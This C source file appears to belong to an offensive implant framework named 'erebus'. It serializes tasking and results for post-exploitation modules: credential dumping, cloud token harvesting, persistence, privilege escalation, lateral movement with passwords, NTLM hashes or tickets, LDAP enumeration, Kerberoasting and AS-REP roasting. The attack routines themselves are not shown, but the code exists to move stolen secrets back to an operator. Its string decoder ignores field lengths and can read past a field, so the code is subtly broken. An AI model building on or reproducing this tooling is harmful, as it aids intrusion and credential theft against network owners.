#include <stdlib.h>
#include <string.h>

#include "erebus/pb_modules.h"
#include "erebus/pb_wire.h"

static void copy_str(char *dst, size_t cap, const char *src) {
    if (!src) src = "";
    strncpy(dst, src, cap - 1);
    dst[cap - 1] = '\0';
}

static int decode_string_field(erebus_pb_reader *r, uint8_t wire, char *dst, size_t cap) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !erebus_pb_read_bytes(r, &b, &n)) return 0;
    copy_str(dst, cap, (const char *)b);
    return 1;
}

static int decode_bytes_field(erebus_pb_reader *r, uint8_t wire, uint8_t **out, size_t *out_len) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !erebus_pb_read_bytes(r, &b, &n)) return 0;
    *out = (uint8_t *)malloc(n);
    if (!*out) return 0;
    memcpy(*out, b, n);
    *out_len = n;
    return 1;
}

static int decode_uint32_field(erebus_pb_reader *r, uint8_t wire, uint32_t *out) {
    uint64_t v;
    if (wire != 0 || !erebus_pb_read_varint(r, &v)) return 0;
    *out = (uint32_t)v;
    return 1;
}

int erebus_pb_decode_module_task(const uint8_t *in, size_t in_len, erebus_module_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, t->module_name, sizeof(t->module_name)); break;
        case 2: decode_bytes_field(&r, wire, &t->config, &t->config_len); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return t->module_name[0] != '\0';
}

void erebus_pb_free_module_task(erebus_module_task *t) {
    free(t->config);
    t->config = NULL;
    t->config_len = 0;
}

int erebus_pb_decode_cloud_harvest_config(const uint8_t *in, size_t in_len, erebus_cloud_harvest_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->provider, sizeof(c->provider)); break;
        case 2: decode_string_field(&r, wire, c->method, sizeof(c->method)); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

int erebus_pb_decode_cred_dump_config(const uint8_t *in, size_t in_len, erebus_cred_dump_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->method, sizeof(c->method)); break;
        case 2: decode_uint32_field(&r, wire, &c->target_pid); break;
        case 3: decode_string_field(&r, wire, c->output_format, sizeof(c->output_format)); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

int erebus_pb_decode_persist_config(const uint8_t *in, size_t in_len, erebus_persist_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->method, sizeof(c->method)); break;
        case 2: decode_string_field(&r, wire, c->name, sizeof(c->name)); break;
        case 3: decode_string_field(&r, wire, c->payload_path, sizeof(c->payload_path)); break;
        case 4: decode_string_field(&r, wire, c->trigger, sizeof(c->trigger)); break;
        case 5: decode_bytes_field(&r, wire, &c->payload, &c->payload_len); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

void erebus_pb_free_persist_config(erebus_persist_config *c) {
    free(c->payload);
    c->payload = NULL;
    c->payload_len = 0;
}

int erebus_pb_decode_privesc_config(const uint8_t *in, size_t in_len, erebus_privesc_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->method, sizeof(c->method)); break;
        case 2: decode_uint32_field(&r, wire, &c->target_pid); break;
        case 3: decode_string_field(&r, wire, c->command, sizeof(c->command)); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

int erebus_pb_decode_lateral_config(const uint8_t *in, size_t in_len, erebus_lateral_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->method, sizeof(c->method)); break;
        case 2: decode_string_field(&r, wire, c->target, sizeof(c->target)); break;
        case 3: decode_string_field(&r, wire, c->domain, sizeof(c->domain)); break;
        case 4: decode_string_field(&r, wire, c->username, sizeof(c->username)); break;
        case 5: decode_string_field(&r, wire, c->password, sizeof(c->password)); break;
        case 6: decode_string_field(&r, wire, c->ntlm_hash, sizeof(c->ntlm_hash)); break;
        case 7: decode_bytes_field(&r, wire, &c->ticket, &c->ticket_len); break;
        case 8: decode_string_field(&r, wire, c->command, sizeof(c->command)); break;
        case 9: decode_bytes_field(&r, wire, &c->payload, &c->payload_len); break;
        case 10: decode_string_field(&r, wire, c->service_name, sizeof(c->service_name)); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

void erebus_pb_free_lateral_config(erebus_lateral_config *c) {
    free(c->ticket);
    free(c->payload);
    c->ticket = NULL;
    c->payload = NULL;
    c->ticket_len = c->payload_len = 0;
}

int erebus_pb_decode_ldap_enum_config(const uint8_t *in, size_t in_len, erebus_ldap_enum_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->target_dc, sizeof(c->target_dc)); break;
        case 2: decode_string_field(&r, wire, c->domain, sizeof(c->domain)); break;
        case 3: decode_string_field(&r, wire, c->username, sizeof(c->username)); break;
        case 4: decode_string_field(&r, wire, c->password, sizeof(c->password)); break;
        case 5: decode_string_field(&r, wire, c->ntlm_hash, sizeof(c->ntlm_hash)); break;
        case 6: decode_string_field(&r, wire, c->query_type, sizeof(c->query_type)); break;
        case 7: decode_string_field(&r, wire, c->custom_filter, sizeof(c->custom_filter)); break;
        case 8:
            if (wire == 2 && c->attribute_count < EREBUS_LDAP_ATTR_MAX) {
                const uint8_t *b;
                size_t n;
                if (erebus_pb_read_bytes(&r, &b, &n)) {
                    char *attr = (char *)malloc(n + 1);
                    if (!attr) return 0;
                    memcpy(attr, b, n);
                    attr[n] = '\0';
                    c->attributes[c->attribute_count++] = attr;
                }
            }
            break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

void erebus_pb_free_ldap_enum_config(erebus_ldap_enum_config *c) {
    for (size_t i = 0; i < c->attribute_count; i++) free(c->attributes[i]);
    c->attribute_count = 0;
}

int erebus_pb_decode_kerberoast_config(const uint8_t *in, size_t in_len, erebus_kerberoast_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->target_dc, sizeof(c->target_dc)); break;
        case 2: decode_string_field(&r, wire, c->domain, sizeof(c->domain)); break;
        case 3: decode_string_field(&r, wire, c->username, sizeof(c->username)); break;
        case 4: decode_string_field(&r, wire, c->password, sizeof(c->password)); break;
        case 5: decode_string_field(&r, wire, c->ntlm_hash, sizeof(c->ntlm_hash)); break;
        case 6:
            if (wire == 2 && c->target_spn_count < 64) {
                const uint8_t *b;
                size_t n;
                if (erebus_pb_read_bytes(&r, &b, &n)) {
                    char *spn = (char *)malloc(n + 1);
                    if (!spn) return 0;
                    memcpy(spn, b, n);
                    spn[n] = '\0';
                    c->target_spns[c->target_spn_count++] = spn;
                }
            }
            break;
        case 7: decode_string_field(&r, wire, c->encryption, sizeof(c->encryption)); break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

void erebus_pb_free_kerberoast_config(erebus_kerberoast_config *c) {
    for (size_t i = 0; i < c->target_spn_count; i++) free(c->target_spns[i]);
    c->target_spn_count = 0;
}

int erebus_pb_decode_asreproast_config(const uint8_t *in, size_t in_len, erebus_asreproast_config *c) {
    memset(c, 0, sizeof(*c));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1: decode_string_field(&r, wire, c->target_dc, sizeof(c->target_dc)); break;
        case 2: decode_string_field(&r, wire, c->domain, sizeof(c->domain)); break;
        case 3:
            if (wire == 2 && c->target_user_count < 256) {
                const uint8_t *b;
                size_t n;
                if (erebus_pb_read_bytes(&r, &b, &n)) {
                    char *u = (char *)malloc(n + 1);
                    if (!u) return 0;
                    memcpy(u, b, n);
                    u[n] = '\0';
                    c->target_users[c->target_user_count++] = u;
                }
            }
            break;
        default: erebus_pb_skip(&r, wire); break;
        }
    }
    return 1;
}

void erebus_pb_free_asreproast_config(erebus_asreproast_config *c) {
    for (size_t i = 0; i < c->target_user_count; i++) free(c->target_users[i]);
    c->target_user_count = 0;
}

int erebus_pb_encode_persist_result(int success, const char *method, const char *details, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 128)) return 0;
    erebus_pb_write_bool(&w, 1, success);
    if (method) erebus_pb_write_string(&w, 2, method);
    if (details) erebus_pb_write_string(&w, 3, details);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_privesc_result(int success, const char *method, const char *new_integrity, uint32_t new_pid, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 128)) return 0;
    erebus_pb_write_bool(&w, 1, success);
    if (method) erebus_pb_write_string(&w, 2, method);
    if (new_integrity) erebus_pb_write_string(&w, 3, new_integrity);
    erebus_pb_write_uint32(&w, 4, new_pid);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_credential(const erebus_credential *c, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    if (c->type[0]) erebus_pb_write_string(&w, 1, c->type);
    if (c->domain[0]) erebus_pb_write_string(&w, 2, c->domain);
    if (c->username[0]) erebus_pb_write_string(&w, 3, c->username);
    if (c->value[0]) erebus_pb_write_string(&w, 4, c->value);
    if (c->source[0]) erebus_pb_write_string(&w, 5, c->source);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_cred_dump_result(const char *method, const erebus_credential *creds, size_t cred_count, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    if (method) erebus_pb_write_string(&w, 1, method);
    for (size_t i = 0; i < cred_count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_credential(&creds[i], &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_bytes(&w, 2, sub, sub_len);
        free(sub);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_cloud_token(const erebus_cloud_token *t, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    if (t->provider[0]) erebus_pb_write_string(&w, 1, t->provider);
    if (t->token_type[0]) erebus_pb_write_string(&w, 2, t->token_type);
    if (t->access_token[0]) erebus_pb_write_string(&w, 3, t->access_token);
    if (t->refresh_token[0]) erebus_pb_write_string(&w, 4, t->refresh_token);
    if (t->tenant_id[0]) erebus_pb_write_string(&w, 5, t->tenant_id);
    if (t->client_id[0]) erebus_pb_write_string(&w, 6, t->client_id);
    if (t->resource[0]) erebus_pb_write_string(&w, 7, t->resource);
    if (t->expires_at) erebus_pb_write_int64(&w, 8, t->expires_at);
    if (t->source[0]) erebus_pb_write_string(&w, 9, t->source);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_cloud_credential(const erebus_cloud_credential *c, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    if (c->provider[0]) erebus_pb_write_string(&w, 1, c->provider);
    if (c->cred_type[0]) erebus_pb_write_string(&w, 2, c->cred_type);
    if (c->identity[0]) erebus_pb_write_string(&w, 3, c->identity);
    if (c->secret[0]) erebus_pb_write_string(&w, 4, c->secret);
    if (c->extra[0]) erebus_pb_write_string(&w, 5, c->extra);
    if (c->source[0]) erebus_pb_write_string(&w, 6, c->source);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_cloud_harvest_result(const char *provider, const char *method,
    const erebus_cloud_token *tokens, size_t token_count,
    const erebus_cloud_credential *creds, size_t cred_count,
    const char *metadata, const char *error, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 1024)) return 0;
    if (provider) erebus_pb_write_string(&w, 1, provider);
    if (method) erebus_pb_write_string(&w, 2, method);
    for (size_t i = 0; i < token_count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_cloud_token(&tokens[i], &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_bytes(&w, 3, sub, sub_len);
        free(sub);
    }
    for (size_t i = 0; i < cred_count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_cloud_credential(&creds[i], &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_bytes(&w, 4, sub, sub_len);
        free(sub);
    }
    if (metadata) erebus_pb_write_string(&w, 5, metadata);
    if (error) erebus_pb_write_string(&w, 6, error);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_lateral_result(const char *method, const char *target, int success, const char *output, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    if (method) erebus_pb_write_string(&w, 1, method);
    if (target) erebus_pb_write_string(&w, 2, target);
    erebus_pb_write_bool(&w, 3, success);
    if (output) erebus_pb_write_string(&w, 4, output);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_ldap_entry_msg(const erebus_ldap_entry *e, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    if (e->dn[0]) erebus_pb_write_string(&w, 1, e->dn);
    for (size_t i = 0; i < e->attr_count; i++) {
        erebus_pb_writer mapw;
        if (!erebus_pb_writer_init(&mapw, 128)) { erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_string(&mapw, 1, e->attr_names[i]);
        erebus_pb_writer valw;
        if (!erebus_pb_writer_init(&valw, 64)) { erebus_pb_writer_free(&mapw); erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_string(&valw, 1, e->attr_values[i]);
        erebus_pb_write_bytes(&mapw, 2, valw.data, valw.len);
        erebus_pb_writer_free(&valw);
        erebus_pb_write_bytes(&w, 2, mapw.data, mapw.len);
        erebus_pb_writer_free(&mapw);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_ldap_enum_result(const char *domain, const char *dc, const char *query_type,
    const erebus_ldap_entry *entries, size_t entry_count, int32_t total, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 1024)) return 0;
    if (domain) erebus_pb_write_string(&w, 1, domain);
    if (dc) erebus_pb_write_string(&w, 2, dc);
    if (query_type) erebus_pb_write_string(&w, 3, query_type);
    for (size_t i = 0; i < entry_count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_ldap_entry_msg(&entries[i], &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
        erebus_pb_write_bytes(&w, 4, sub, sub_len);
        free(sub);
    }
    erebus_pb_write_uint32(&w, 5, (uint32_t)total);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

void erebus_pb_free_ldap_entries(erebus_ldap_entry *entries, size_t count) {
    for (size_t i = 0; i < count; i++) {
        for (size_t j = 0; j < entries[i].attr_count; j++) {
            free(entries[i].attr_names[j]);
            free(entries[i].attr_values[j]);
        }
        entries[i].attr_count = 0;
    }
}

static int encode_kerberoast_hash(const char *spn, const char *sam, const char *hash, const char *enc, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    if (spn) erebus_pb_write_string(&w, 1, spn);
    if (sam) erebus_pb_write_string(&w, 2, sam);
    if (hash) erebus_pb_write_string(&w, 3, hash);
    if (enc) erebus_pb_write_string(&w, 4, enc);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_kerberoast_result(const char *spn, const char *sam, const char *hash, const char *enc, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    uint8_t *sub = NULL;
    size_t sub_len = 0;
    if (!encode_kerberoast_hash(spn, sam, hash, enc, &sub, &sub_len)) { erebus_pb_writer_free(&w); return 0; }
    erebus_pb_write_bytes(&w, 1, sub, sub_len);
    free(sub);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_asreproast_result(const char *username, const char *hash, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 128)) return 0;
    size_t mark;
    erebus_pb_write_submsg_begin(&w, 1, &mark);
    if (username) erebus_pb_write_string(&w, 1, username);
    if (hash) erebus_pb_write_string(&w, 2, hash);
    erebus_pb_write_submsg_end(&w, mark);
    *out = w.data;
    *out_len = w.len;
    return 1;
}